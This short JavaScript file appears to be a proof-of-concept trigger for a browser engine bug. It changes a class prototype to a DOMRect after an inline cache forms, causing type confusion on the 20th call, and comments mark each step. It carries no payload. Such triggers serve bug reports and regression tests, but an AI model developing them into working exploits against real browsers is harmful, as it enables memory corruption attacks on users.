class B {
  m() {
    return super.x;
  }
}

function main() {
  var domRect = new DOMRect(1, 1, 1, 1);
  domRect['a' + i] = 1;
  if (i < 20 - 1) {
    B.prototype.__proto__ = {};  //<----- sets to `{}` to avoid throw before triggering bug.
  } else {
    B.prototype.__proto__ = domRect;  //<----- triggers the bug after inline cache is created.
  }
  let b = new B();

  b.x0 = 0x40404040;
  b.x1 = 0x41414141;
  b.x2 = 0x42424242;
  b.x3 = 0x43434343;
  domRect.x; //<------ create inline cache
  b.m();     //<------ use inline cache, type confusion on i == 20
}  

for (let i = 0; i < 20; i++) main(i);